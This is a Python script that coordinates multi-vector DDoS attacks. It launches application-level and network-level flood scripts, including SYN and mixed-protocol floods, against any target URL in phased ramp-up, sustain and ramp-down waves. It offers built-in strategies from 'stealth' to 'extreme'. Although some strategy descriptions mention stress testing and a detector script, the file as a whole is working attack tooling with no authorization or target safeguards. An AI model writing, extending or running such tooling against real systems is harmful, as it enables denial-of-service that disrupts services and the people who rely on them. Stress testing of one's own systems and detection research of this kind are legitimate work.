#!/usr/bin/env python3
"""
Attack Orchestrator - Multi-Vector DDoS Coordination

Coordinates simultaneous application-level and network-level attacks for maximum impact.
Implements attack strategies with phased execution, escalation patterns, and centralized telemetry.

Features:
1. Multi-vector attack coordination (app + network)
2. Phased attack execution (ramp-up, sustain, ramp-down)
3. Attack strategy management (from YAML configs)
4. Centralized metrics collection
5. Real-time attack monitoring
6. Graceful shutdown and cleanup

Usage:
    python3 orchestrator.py --strategy aggressive --duration 300
    python3 orchestrator.py --config configs/attack-strategies/stealth-test.yaml
"""

import argparse
import asyncio
import json
import subprocess
import sys
import time
import yaml
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum


class AttackPhase(Enum):
    """Attack execution phases"""
    RAMP_UP = "ramp_up"
    SUSTAIN = "sustain"
    RAMP_DOWN = "ramp_down"
    COMPLETE = "complete"


class AttackVector(Enum):
    """Attack vector types"""
    APP_LEVEL = "app_level"
    NETWORK_LEVEL = "network_level"
    COMBINED = "combined"


@dataclass
class VectorConfig:
    """Configuration for a single attack vector"""
    enabled: bool = True
    script: str = ""
    duration: int = 60
    workers: int = 10
    mode: str = "moderate"
    pattern: str = "constant"
    rate: Optional[int] = None
    protocol: Optional[str] = None  # For network attacks
    additional_args: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.additional_args is None:
            self.additional_args = {}


@dataclass
class AttackStrategy:
    """Complete attack strategy definition"""
    name: str
    description: str
    vector: AttackVector
    app_level: VectorConfig
    network_level: VectorConfig
    phases: Dict[str, int] = None  # Phase durations
    target_url: str = ""
    adapter_config: Optional[str] = None
    discovery_file: Optional[str] = None
    
    def __post_init__(self):
        if self.phases is None:
            self.phases = {
                "ramp_up": 30,
                "sustain": 0,  # Calculated from total duration
                "ramp_down": 30
            }


@dataclass
class OrchestrationMetrics:
    """Centralized metrics for orchestrated attack"""
    start_time: datetime
    end_time: Optional[datetime] = None
    current_phase: AttackPhase = AttackPhase.RAMP_UP
    app_level_status: str = "not_started"
    network_level_status: str = "not_started"
    app_level_metrics: Dict = None
    network_level_metrics: Dict = None
    errors: List[str] = None
    
    def __post_init__(self):
        if self.app_level_metrics is None:
            self.app_level_metrics = {}
        if self.network_level_metrics is None:
            self.network_level_metrics = {}
        if self.errors is None:
            self.errors = []


class AttackOrchestrator:
    """
    Orchestrates multi-vector DDoS attacks with phased execution
    """
    
    def __init__(
        self,
        strategy: AttackStrategy,
        total_duration: int,
        verbose: bool = False
    ):
        self.strategy = strategy
        self.total_duration = total_duration
        self.verbose = verbose
        
        # Calculate phase durations
        ramp_up_duration = strategy.phases.get("ramp_up", 30)
        ramp_down_duration = strategy.phases.get("ramp_down", 30)
        sustain_duration = total_duration - ramp_up_duration - ramp_down_duration
        
        if sustain_duration < 0:
            raise ValueError(f"Total duration {total_duration}s too short for ramp phases")
        
        self.phase_durations = {
            AttackPhase.RAMP_UP: ramp_up_duration,
            AttackPhase.SUSTAIN: sustain_duration,
            AttackPhase.RAMP_DOWN: ramp_down_duration
        }
        
        # Metrics
        self.metrics = OrchestrationMetrics(start_time=datetime.now())
        
        # Process handles
        self.app_process: Optional[subprocess.Popen] = None
        self.network_process: Optional[subprocess.Popen] = None
    
    def _build_command(self, vector_config: VectorConfig, phase: AttackPhase) -> List[str]:
        """Build command line for attack vector"""
        cmd = ["python3", vector_config.script]
        
        # Required args
        cmd.extend(["--url", self.strategy.target_url])
        cmd.extend(["--duration", str(vector_config.duration)])
        cmd.extend(["--workers", str(vector_config.workers)])
        
        # Optional target adapter args
        if self.strategy.adapter_config:
            cmd.extend(["--adapter-config", self.strategy.adapter_config])
        if self.strategy.discovery_file:
            cmd.extend(["--discovery-file", self.strategy.discovery_file])
        
        # Mode and pattern
        cmd.extend(["--mode", vector_config.mode])
        cmd.extend(["--pattern", vector_config.pattern])
        
        # Rate (if specified)
        if vector_config.rate:
            if "network" in vector_config.script:
                cmd.extend(["--pps", str(vector_config.rate)])
            else:
                cmd.extend(["--rate", str(vector_config.rate)])
        
        # Protocol (for network attacks)
        if vector_config.protocol:
            cmd.extend(["--protocol", vector_config.protocol])
        
        # Phase-specific adjustments
        if phase == AttackPhase.RAMP_UP:
            # Start with ramp pattern for gradual escalation
            if "--pattern" in cmd:
                idx = cmd.index("--pattern")
                cmd[idx + 1] = "ramp"
        
        elif phase == AttackPhase.RAMP_DOWN:
            # Use burst pattern with decreasing rate
            if "--pattern" in cmd:
                idx = cmd.index("--pattern")
                cmd[idx + 1] = "burst"
        
        # Additional args
        for key, value in vector_config.additional_args.items():
            if isinstance(value, bool):
                if value:
                    cmd.append(f"--{key}")
            else:
                cmd.extend([f"--{key}", str(value)])
        
        return cmd
    
    def _launch_vector(
        self,
        vector_name: str,
        vector_config: VectorConfig,
        phase: AttackPhase
    ) -> Optional[subprocess.Popen]:
        """Launch a single attack vector"""
        if not vector_config.enabled:
            print(f"[{vector_name}] Disabled, skipping")
            return None
        
        cmd = self._build_command(vector_config, phase)
        
        print(f"[{vector_name}] Launching: {' '.join(cmd)}")
        
        try:
            # Launch process (non-blocking)
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE if self.verbose else subprocess.DEVNULL,
                stderr=subprocess.PIPE if self.verbose else subprocess.DEVNULL,
                text=True,
                bufsize=1
            )
            
            if vector_name == "APP":
                self.metrics.app_level_status = "running"
            else:
                self.metrics.network_level_status = "running"
            
            return process
        
        except FileNotFoundError:
            error = f"{vector_name}: Script not found: {vector_config.script}"
            print(f"ERROR: {error}")
            self.metrics.errors.append(error)
            return None
        
        except Exception as e:
            error = f"{vector_name}: Launch failed: {e}"
            print(f"ERROR: {error}")
            self.metrics.errors.append(error)
            return None
    
    def _monitor_process(self, process: subprocess.Popen, vector_name: str):
        """Monitor process output (if verbose)"""
        if not self.verbose or not process:
            return
        
        # Read stdout in non-blocking mode
        try:
            import select
            if select.select([process.stdout], [], [], 0)[0]:
                line = process.stdout.readline()
                if line:
                    print(f"[{vector_name}] {line.strip()}")
        except:
            pass
    
    def _wait_for_processes(self, timeout: int):
        """Wait for processes with timeout"""
        start = time.time()
        
        while time.time() - start < timeout:
            # Check app process
            if self.app_process and self.app_process.poll() is None:
                self._monitor_process(self.app_process, "APP")
            elif self.app_process:
                self.metrics.app_level_status = "completed"
                self.app_process = None
            
            # Check network process
            if self.network_process and self.network_process.poll() is None:
                self._monitor_process(self.network_process, "NETWORK")
            elif self.network_process:
                self.metrics.network_level_status = "completed"
                self.network_process = None
            
            # Both completed?
            if not self.app_process and not self.network_process:
                break
            
            time.sleep(1)
    
    def _terminate_processes(self):
        """Gracefully terminate all processes"""
        if self.app_process:
            print("[APP] Terminating...")
            self.app_process.terminate()
            try:
                self.app_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.app_process.kill()
            self.metrics.app_level_status = "terminated"
        
        if self.network_process:
            print("[NETWORK] Terminating...")
            self.network_process.terminate()
            try:
                self.network_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.network_process.kill()
            self.metrics.network_level_status = "terminated"
    
    def _execute_phase(self, phase: AttackPhase):
        """Execute a single attack phase"""
        duration = self.phase_durations[phase]
        self.metrics.current_phase = phase
        
        print(f"\n{'='*70}")
        print(f"📍 PHASE: {phase.value.upper().replace('_', ' ')}")
        print(f"{'='*70}")
        print(f"Duration: {duration}s")
        
        # Update vector durations for this phase
        if self.strategy.vector in [AttackVector.APP_LEVEL, AttackVector.COMBINED]:
            self.strategy.app_level.duration = duration
        
        if self.strategy.vector in [AttackVector.NETWORK_LEVEL, AttackVector.COMBINED]:
            self.strategy.network_level.duration = duration
        
        # Launch vectors
        if self.strategy.vector == AttackVector.APP_LEVEL:
            self.app_process = self._launch_vector("APP", self.strategy.app_level, phase)
        
        elif self.strategy.vector == AttackVector.NETWORK_LEVEL:
            self.network_process = self._launch_vector("NETWORK", self.strategy.network_level, phase)
        
        elif self.strategy.vector == AttackVector.COMBINED:
            self.app_process = self._launch_vector("APP", self.strategy.app_level, phase)
            self.network_process = self._launch_vector("NETWORK", self.strategy.network_level, phase)
        
        # Wait for phase completion
        print(f"\nExecuting {phase.value} phase for {duration}s...")
        self._wait_for_processes(duration)
        
        print(f"✓ Phase {phase.value} complete")
    
    def run(self):
        """Execute the orchestrated attack"""
        print(f"\n{'='*70}")
        print(f"🎯 ATTACK ORCHESTRATION")
        print(f"{'='*70}")
        print(f"Strategy: {self.strategy.name}")
        print(f"Description: {self.strategy.description}")
        print(f"Vector: {self.strategy.vector.value.upper()}")
        print(f"Total Duration: {self.total_duration}s")
        print(f"")
        print(f"Phase Schedule:")
        print(f"  1. Ramp Up: {self.phase_durations[AttackPhase.RAMP_UP]}s")
        print(f"  2. Sustain: {self.phase_durations[AttackPhase.SUSTAIN]}s")
        print(f"  3. Ramp Down: {self.phase_durations[AttackPhase.RAMP_DOWN]}s")
        print(f"")
        
        if self.strategy.app_level.enabled:
            print(f"App-Level Attack:")
            print(f"  Script: {self.strategy.app_level.script}")
            print(f"  Workers: {self.strategy.app_level.workers}")
            print(f"  Mode: {self.strategy.app_level.mode}")
            print(f"")
        
        if self.strategy.network_level.enabled:
            print(f"Network-Level Attack:")
            print(f"  Script: {self.strategy.network_level.script}")
            print(f"  Workers: {self.strategy.network_level.workers}")
            print(f"  Protocol: {self.strategy.network_level.protocol}")
            print(f"")
        
        print(f"{'='*70}\n")
        
        input("Press Enter to start orchestrated attack...")
        
        try:
            # Phase 1: Ramp Up
            self._execute_phase(AttackPhase.RAMP_UP)
            
            # Phase 2: Sustain
            if self.phase_durations[AttackPhase.SUSTAIN] > 0:
                self._execute_phase(AttackPhase.SUSTAIN)
            
            # Phase 3: Ramp Down
            self._execute_phase(AttackPhase.RAMP_DOWN)
            
            self.metrics.current_phase = AttackPhase.COMPLETE
        
        except KeyboardInterrupt:
            print("\n\n⚠️  Orchestration interrupted by user")
            self._terminate_processes()
        
        except Exception as e:
            print(f"\n\n❌ Orchestration error: {e}")
            self.metrics.errors.append(str(e))
            self._terminate_processes()
        
        finally:
            self.metrics.end_time = datetime.now()
            self._print_results()
    
    def _print_results(self):
        """Print orchestration results"""
        elapsed = (self.metrics.end_time - self.metrics.start_time).total_seconds()
        
        print(f"\n{'='*70}")
        print(f"✅ ORCHESTRATION COMPLETE")
        print(f"{'='*70}")
        print(f"Strategy: {self.strategy.name}")
        print(f"Elapsed: {elapsed:.1f}s")
        print(f"Final Phase: {self.metrics.current_phase.value}")
        print(f"")
        print(f"Vector Status:")
        print(f"  App-Level: {self.metrics.app_level_status}")
        print(f"  Network-Level: {self.metrics.network_level_status}")
        
        if self.metrics.errors:
            print(f"")
            print(f"Errors ({len(self.metrics.errors)}):")
            for error in self.metrics.errors:
                print(f"  • {error}")
        
        print(f"")
        print(f"CROSSFIRE IMPACT:")
        print(f"✓ Multi-vector coordinated attack executed")
        print(f"✓ Phased approach simulates realistic attack pattern")
        print(f"✓ Combined app and network vectors maximize impact")
        print(f"")
        print(f"Monitor target degradation with: python3 crossfire-detector.py")
        print(f"{'='*70}\n")


def load_strategy_from_yaml(config_path: str) -> AttackStrategy:
    """Load attack strategy from YAML configuration"""
    with open(config_path, 'r') as f:
        config = yaml.safe_load(f)
    
    # Parse vector configs
    app_config = config.get('app_level', {})
    net_config = config.get('network_level', {})
    
    app_level = VectorConfig(
        enabled=app_config.get('enabled', True),
        script=app_config.get('script', 'crossfire_enhanced.py'),
        workers=app_config.get('workers', 50),
        mode=app_config.get('mode', 'moderate'),
        pattern=app_config.get('pattern', 'constant'),
        rate=app_config.get('rate'),
        additional_args=app_config.get('additional_args', {})
    )
    
    network_level = VectorConfig(
        enabled=net_config.get('enabled', True),
        script=net_config.get('script', 'network_crossfire_enhanced.py'),
        workers=net_config.get('workers', 10),
        mode=net_config.get('mode', 'moderate'),
        pattern=net_config.get('pattern', 'constant'),
        rate=net_config.get('pps'),
        protocol=net_config.get('protocol', 'syn'),
        additional_args=net_config.get('additional_args', {})
    )
    
    # Determine vector type
    if app_level.enabled and network_level.enabled:
        vector = AttackVector.COMBINED
    elif app_level.enabled:
        vector = AttackVector.APP_LEVEL
    else:
        vector = AttackVector.NETWORK_LEVEL
    
    return AttackStrategy(
        name=config.get('name', 'Custom'),
        description=config.get('description', ''),
        vector=vector,
        app_level=app_level,
        network_level=network_level,
        phases=config.get('phases', {}),
        target_url=config.get('target_url', ''),
        adapter_config=config.get('adapter_config'),
        discovery_file=config.get('discovery_file')
    )


def create_builtin_strategy(name: str, target_url: str) -> AttackStrategy:
    """Create a built-in attack strategy"""
    
    if name == "stealth":
        return AttackStrategy(
            name="Stealth Test",
            description="Low-intensity attack for testing detection",
            vector=AttackVector.APP_LEVEL,
            app_level=VectorConfig(
                enabled=True,
                script="crossfire_enhanced.py",
                workers=10,
                mode="stealth",
                pattern="random",
                additional_args={"stealth": True}
            ),
            network_level=VectorConfig(enabled=False),
            target_url=target_url
        )
    
    elif name == "moderate":
        return AttackStrategy(
            name="Moderate Attack",
            description="Balanced attack for testing mitigations",
            vector=AttackVector.COMBINED,
            app_level=VectorConfig(
                enabled=True,
                script="crossfire_enhanced.py",
                workers=50,
                mode="moderate",
                pattern="constant"
            ),
            network_level=VectorConfig(
                enabled=True,
                script="network_crossfire_enhanced.py",
                workers=10,
                protocol="syn",
                pattern="constant"
            ),
            target_url=target_url
        )
    
    elif name == "aggressive":
        return AttackStrategy(
            name="Aggressive Attack",
            description="High-intensity sustained attack",
            vector=AttackVector.COMBINED,
            app_level=VectorConfig(
                enabled=True,
                script="crossfire_enhanced.py",
                workers=100,
                mode="aggressive",
                pattern="burst"
            ),
            network_level=VectorConfig(
                enabled=True,
                script="network_crossfire_enhanced.py",
                workers=20,
                protocol="mixed",
                pattern="burst"
            ),
            target_url=target_url
        )
    
    elif name == "extreme":
        return AttackStrategy(
            name="Extreme Stress Test",
            description="Maximum intensity for capacity testing",
            vector=AttackVector.COMBINED,
            app_level=VectorConfig(
                enabled=True,
                script="crossfire_enhanced.py",
                workers=200,
                mode="extreme",
                pattern="wave"
            ),
            network_level=VectorConfig(
                enabled=True,
                script="network_crossfire_enhanced.py",
                workers=50,
                protocol="mixed",
                pattern="wave"
            ),
            target_url=target_url
        )
    
    else:
        raise ValueError(f"Unknown strategy: {name}")


def main():
    parser = argparse.ArgumentParser(
        description='Attack Orchestrator - Multi-Vector DDoS Coordination',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Strategy selection
    strategy_group = parser.add_mutually_exclusive_group(required=True)
    strategy_group.add_argument(
        '--strategy',
        choices=['stealth', 'moderate', 'aggressive', 'extreme'],
        help='Built-in attack strategy'
    )
    strategy_group.add_argument(
        '--config',
        help='Path to YAML strategy configuration'
    )
    
    # Target configuration
    parser.add_argument('--url', help='Target base URL (required for built-in strategies)')
    parser.add_argument('--adapter-config', help='Path to target adapter YAML')
    parser.add_argument('--discovery-file', help='Path to endpoint discovery JSON')
    
    # Execution options
    parser.add_argument('--duration', type=int, default=180, help='Total attack duration (seconds)')
    parser.add_argument('--verbose', action='store_true', help='Show attack vector outputs')
    
    args = parser.parse_args()
    
    # Load or create strategy
    if args.config:
        try:
            strategy = load_strategy_from_yaml(args.config)
            # Override target URL if provided
            if args.url:
                strategy.target_url = args.url
        except Exception as e:
            print(f"Error loading strategy config: {e}")
            sys.exit(1)
    else:
        if not args.url:
            print("Error: --url required for built-in strategies")
            sys.exit(1)
        strategy = create_builtin_strategy(args.strategy, args.url)
    
    # Override adapter config if provided
    if args.adapter_config:
        strategy.adapter_config = args.adapter_config
    if args.discovery_file:
        strategy.discovery_file = args.discovery_file
    
    # Validate strategy
    if not strategy.target_url:
        print("Error: No target URL specified in strategy or command line")
        sys.exit(1)
    
    # Create orchestrator
    orchestrator = AttackOrchestrator(
        strategy=strategy,
        total_duration=args.duration,
        verbose=args.verbose
    )
    
    try:
        orchestrator.run()
    except Exception as e:
        print(f"\n❌ Orchestration failed: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
